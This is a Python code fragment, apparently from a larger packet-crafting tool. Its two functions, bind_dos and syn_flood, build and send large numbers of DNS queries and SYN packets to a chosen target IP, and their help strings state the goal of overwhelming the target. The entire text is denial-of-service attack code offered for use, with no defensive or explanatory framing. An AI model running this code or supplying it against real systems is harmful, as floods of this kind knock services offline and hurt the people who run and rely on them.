def bind_dos(values):
    print("Launching multiple packets of DNS to DNS port")
    valid_var = ["target_ip", "query_type", "query_name","quantity"]
    help_statement = "\nsends a multitude of DNS queries to attempt to overwhelm the target"
    bind = []
    variable_input(valid_var, help_statement)
    all_variables_inputted(valid_var)
    check_var(values, valid_var)
    template = IP(dst=values.get("target_ip"))/UDP()/DNS(rd=1,qd=DNSQR(qtype=values.get("query_type"),qname=values.get("query_name")))
    pktAmt = values.get("quantity")
    for pktNum in range(0,pktAmt):
    	bind.extend(template)
    	bind[pktNum][UDP].dport = 53
    send(bind)
    print("Packets sent")

def syn_flood(values):
    print("SYN Flood")
    valid_var = ["target_ip", "quantity"]
    help_statement = "\nsends a multitude of SYN packets to attempt to overwhelm the target"
    variable_input(valid_var, help_statement)
    all_variables_inputted(valid_var)
    check_var(values, valid_var)
    template = IP(dst=values.get("target_ip"), ttl=99)/TCP(sport=RandShort(), seq=12345, ack=1000, flags="S", options=topt)
    ns = []
    pktAmt = values.get("quantity")
    for pktNum in range(0,pktAmt):
    	ns.extend(template)
    	ns[pktNum][TCP].dport = randint(1,65535)
    send(ns)
    print("Packets sent")
